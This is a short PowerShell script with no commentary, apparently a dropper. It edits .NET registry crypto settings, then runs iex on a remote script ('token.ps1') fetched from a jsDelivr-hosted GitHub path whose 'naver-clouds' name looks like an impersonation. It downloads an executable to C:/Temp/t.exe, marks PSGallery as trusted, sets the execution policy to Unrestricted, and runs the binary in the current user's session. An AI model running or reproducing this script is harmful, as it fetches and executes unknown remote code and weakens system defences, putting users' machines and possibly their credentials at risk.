Set-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord;
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord;
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
mkdir "C:/Temp" -force;
iex (New-Object Net.WebClient).DownloadString('https://cdn.jsdelivr.net/gh/naver-clouds/cdn/file/token.ps1');
powershell -Command "Invoke-WebRequest 'https://cdn.jsdelivr.net/gh/naver-clouds/cdn/file/sca' -OutFile C:/Temp/t.exe";
Install-PackageProvider NuGet -Force;
Set-PSRepository PSGallery -InstallationPolicy Trusted
Install-Module RunAsUser -Repository PSGallery
Set-ExecutionPolicy Unrestricted
invoke-ascurrentuser -scriptblock { C:\Temp\t.exe | out-file "C:\Temp\HelloWorld.txt" }
